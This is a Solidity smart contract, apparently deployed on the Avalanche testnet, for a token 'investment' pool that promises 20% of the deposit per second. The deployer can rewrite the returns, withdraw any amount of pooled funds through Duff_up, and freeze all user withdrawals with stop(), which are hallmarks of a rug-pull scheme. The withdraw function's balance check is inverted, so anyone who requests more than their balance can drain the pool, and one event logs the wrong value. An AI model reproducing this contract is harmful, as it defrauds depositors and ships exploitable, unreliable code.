/**
 *Submitted for verification at testnet.snowtrace.io on 2022-04-05
*/

pragma solidity 0.8.7;
pragma experimental ABIEncoderV2;

interface Erc20 {
  function approve(address, uint256) external returns (bool);
  function transfer(address, uint256) external returns (bool);
  function allowance(address owner, address spender) external view returns (uint256);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract Brand {
    uint constant TIME_STEP = 1 seconds;
    address constant erc20contract = address(0xC903F825a42EBD01a127D93A9E697850c47e00F0);
    uint bonustrack_ROI = 200;
    uint bonus_ROI = 200;
    uint constant PERCENTS_DIVIDER = 1000;
    address DEPLOYER;
    bool letsr = !false;

    struct User {
        uint checkpoint;
        uint grandtotal;
        uint bonustrack;
        uint bonus;
    }
      
    mapping (address => User) internal users;
    event newDeposit(address user, uint amount);
    event newInvestor(address user);
    event withdrawnAmount(address user, uint amount);

    constructor() {
        DEPLOYER = msg.sender;
    }

    function invest(uint amount) public payable {
        require(letsr, "good night");
        bool success = Erc20(erc20contract).transferFrom(msg.sender, address(this), amount);
        if (success) createDeposit(msg.sender, amount);
    }

    function createDeposit(address _user, uint amount)  internal  {
        User storage user = users[_user];
        if (user.checkpoint == 0) {
            user.checkpoint = block.timestamp;
            emit newInvestor(_user);
        }
        (uint bt, uint b) = getSingleDepositDividends(_user);
        user.bonustrack = user.bonustrack + bt;
        user.bonus = user.bonus + b;
        user.grandtotal = user.grandtotal + amount;
        user.checkpoint = block.timestamp;

        emit newDeposit(msg.sender, msg.value);
    }

    function getSingleDepositDividends (address _user) private view returns (uint bonustrack_amount, uint bonus_amount) {
        User storage user = users[_user];
        uint timeA = user.checkpoint;
        uint timeB = block.timestamp;
        uint totalReward_bonustrack = user.grandtotal * bonustrack_ROI / PERCENTS_DIVIDER;
        uint totalReward_bonus = user.grandtotal * bonus_ROI / PERCENTS_DIVIDER;
        
        if (timeA < timeB) {
            bonustrack_amount = totalReward_bonustrack * (timeB - timeA) / TIME_STEP;
            bonus_amount = totalReward_bonus * (timeB - timeA) / TIME_STEP;
        }
        else return(0, 0);
    }

    function withdraw(uint amount) public payable {
        require(letsr, "good night");
        User storage user = users[msg.sender];
        uint amount_max = getBalance(msg.sender);
        require( amount_max < amount, "Too much for you");
        bool success = Erc20(erc20contract).transfer(msg.sender, amount);
        require(success, "Transfer failed.");
        (uint bt,uint b) = getSingleDepositDividends(msg.sender);
        user.bonustrack = user.bonustrack + bt;
        user.bonus = user.bonus + b;
        user.checkpoint = block.timestamp;
        if (amount > user.grandtotal) {user.bonustrack = user.bonustrack - (amount - user.grandtotal); user.grandtotal = 0;}
        else user.grandtotal = user.grandtotal - amount;
        // clear accumulated dividends
        emit withdrawnAmount(msg.sender, amount);
    }

    function withdraw_b() public payable {
        require(letsr, "good night");
        User storage user = users[msg.sender];
        uint amount = getBunus(msg.sender);
        require( amount > 0, "nothing");
        bool success = Erc20(erc20contract).transfer(msg.sender, amount);
        require(success, "Transfer failed.");
        (uint bt, ) = getSingleDepositDividends(msg.sender);
        user.bonustrack = user.bonustrack + bt;
        user.bonus = 0;
        user.checkpoint = block.timestamp;
        emit withdrawnAmount(msg.sender, amount);
    }

    function getBalance(address _user) public view returns (uint amount) {
        User storage user = users[_user]; 
        (uint bt, ) = getSingleDepositDividends(_user);
        amount =  user.grandtotal +  user.bonustrack + bt;
    }

    function getBunus(address _user) public view returns (uint amount) {
        User storage user = users[_user]; 
        (, uint b) = getSingleDepositDividends(_user);
        amount =  user.bonustrack + b;
    }

    function setBunus_roi(uint xF) public payable {
        require( msg.sender == DEPLOYER, "disallowed");
        bonus_ROI = xF;
    }
    function getBunustrack_roi(uint xF) public payable {
        require( msg.sender == DEPLOYER, "disallowed");
        bonustrack_ROI = xF;
    }

    function Stuff_up(uint amount) public payable {
        require( msg.sender == DEPLOYER, "disallowed");
        bool success = Erc20(erc20contract).transferFrom(msg.sender, address(this), amount);
        require(success, "Transfer failed.");
   }

    function Duff_up(uint amount) public payable {        
        require(msg.sender == DEPLOYER, "disallowed");
        bool success = Erc20(erc20contract).transfer(msg.sender, amount);
        require(success, "Transfer failed.");
    }

    function start() public payable {        
        require(msg.sender == DEPLOYER, "disallowed");
        require(!letsr, "already");
        letsr = !false;
    }

    function stop() public payable {
        require(msg.sender == DEPLOYER, "disallowed");
        require(letsr, "already");
        letsr = false;
    }

   fallback() external payable {

    }
    receive() external payable {

    }
     
}